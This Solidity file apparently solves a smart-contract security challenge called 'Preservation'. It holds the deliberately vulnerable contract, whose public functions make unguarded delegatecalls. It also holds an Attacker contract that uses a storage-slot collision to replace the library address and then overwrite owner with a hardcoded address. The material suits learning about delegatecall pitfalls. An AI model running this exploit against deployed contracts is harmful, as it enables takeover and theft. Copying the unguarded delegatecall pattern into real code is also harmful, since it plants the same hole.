// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(
        address _timeZone1LibraryAddress,
        address _timeZone2LibraryAddress
    ) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint _timeStamp) public {
        timeZone1Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }

    // set the time for timezone 2
    function setSecondTime(uint _timeStamp) public {
        timeZone2Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint storedTime;

    function setTime(uint _time) public {
        storedTime = _time;
    }
}

contract Attacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(Preservation preservation) external {
        // timeZone1Library will be this address after this call
        preservation.setFirstTime(uint256(uint160(address(this))));
    }

    function setTime(uint _time) external {
        // this will change the target contracts owner storage variable owner to my address
        owner = address(0xe4064d8E292DCD971514972415664765e51B5364);
    }
}
